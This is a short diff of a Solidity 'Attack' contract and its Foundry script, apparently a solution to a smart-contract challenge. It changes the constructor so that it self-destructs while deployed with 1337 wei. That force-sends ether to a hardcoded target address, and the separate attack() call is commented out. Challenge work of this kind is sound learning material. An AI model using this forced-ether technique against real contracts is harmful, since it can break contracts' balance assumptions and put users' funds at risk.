@@ -13,7 +13,7 @@ interface Ichall{
 contract Attack{
     address target = 0x563DFa5dFe25E6e5EBbc734E1aABDDdf332b1b5a;
     constructor()  {
-        
+        selfdestruct(payable(target));
     }
 
     function attack() public payable {
@@ -31,9 +31,9 @@ contract CounterScript is Script {
 
         vm.startBroadcast();
 
-        Attack zz = new Attack();
+        Attack zz = new Attack{value: 1337 wei}();
         
-        zz.attack();
+        //zz.attack();
         vm.stopBroadcast();
     }
 }
